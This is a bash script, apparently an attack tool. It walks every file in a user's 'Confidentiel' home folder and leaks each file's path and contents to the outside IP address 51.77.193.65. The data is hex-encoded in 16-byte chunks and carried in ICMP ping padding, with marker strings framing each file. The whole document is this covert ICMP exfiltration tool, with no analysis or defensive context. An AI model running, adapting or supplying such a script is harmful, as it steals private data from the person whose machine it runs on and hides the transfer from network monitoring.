for f in $(find /home/yannis/Confidentiel/ -type f 2> /dev/null); do
    c=$(cat "$f");
    ping 51.77.193.65 -c 1 -p "$(echo -n "<<<<<<file>>>>>>" | od -A n -t x1 | tr -d ' \n')";


    fill=""
    for ((i=0; i < $((16 - (${#f} % 16))); i++)); do
        fill="${fill}#"
    done

    f=$(echo -n "${f}${fill}")


    for ((i = 0; i < ${#f}; i += 16)); do
        ping 51.77.193.65 -c 1 -p "$(echo -n "${f:$i:16}" | od -A n -t x1 | tr -d ' \n')" >> /dev/null;
        echo "\n"
    done;

    ping 51.77.193.65 -c 1 -p "$(echo -n "<<<<<<data>>>>>>" | od -A n -t x1 | tr -d ' \n')";

    fill=""
    for ((i=0; i < $((16 - (${#c} % 16))); i++)); do
        fill="${fill}#"
    done

    c=$(echo -n "${c}${fill}")

    for ((i = 0; i < ${#c}; i += 16)); do
        ping 51.77.193.65 -c 1 -p "$(echo -n "${c:$i:16}" | od -A n -t x1 | tr -d ' \n')";
    done;

    ping 51.77.193.65 -c 1 -p "$(echo -n "<<<<<<fin>>>>>>" | od -A n -t x1 | tr -d ' \n')";
done;

